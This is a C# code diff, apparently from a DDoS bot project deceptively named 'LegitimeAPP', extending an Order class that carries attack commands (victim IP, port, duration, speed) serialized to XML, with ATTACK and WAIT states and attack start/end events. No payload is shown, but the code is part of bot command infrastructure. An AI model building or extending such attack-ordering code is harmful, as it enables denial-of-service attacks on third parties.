@@ -21,6 +21,8 @@ namespace LegitimeAPP.Shared
     public class Order
     {
 
+        [XmlElement("type_action")]
+        public TypeAction action ;
 
         [XmlElement("port")]
         public int Port;
@@ -45,14 +47,25 @@ namespace LegitimeAPP.Shared
         public event EventConnectionHandler EndAttackOrder;
 
 
-        public void OnNewAttackOrder() => NewAttackOrder?.Invoke();
-        public void OnEndAttackOrder() => EndAttackOrder?.Invoke();
+        public void OnNewAttackOrder() {
+            NewAttackOrder?.Invoke();
+        } 
+        public void OnEndAttackOrder() {
+            EndAttackOrder?.Invoke();
+        } 
 
-
+        // Pour la serialization
         public Order() { }
 
-        public Order(int Port, string VictimIP, int nbSecond, int speed = 250)
+        // Constructeur pour indiquer un état 
+        public Order(TypeAction action) {
+            this.action = action ;
+        }
+
+        // Constructeur pour ordonner une attaque 
+        public Order(int Port, string VictimIP, int nbSecond, int speed = 250, TypeAction action = TypeAction.ATTACK)
         {
+            this.action = TypeAction.ATTACK ; 
             this.Port = Port;
             this.VictimIP = VictimIP;
             this.nbSecond = nbSecond;
@@ -96,6 +109,7 @@ namespace LegitimeAPP.Shared
                         Console.WriteLine("The Elapsed event was raised at {0:HH:mm:ss.fff}",
                           DateTime.Now);
                         OnEndAttackOrder();
+                       // WriteNetMessage(Data<Order>.DataToXml(new Order(TypeAction.WAIT))) ; 
                         Timer.Dispose() ; 
                         executingThis = new Thread(Exec);
                     }
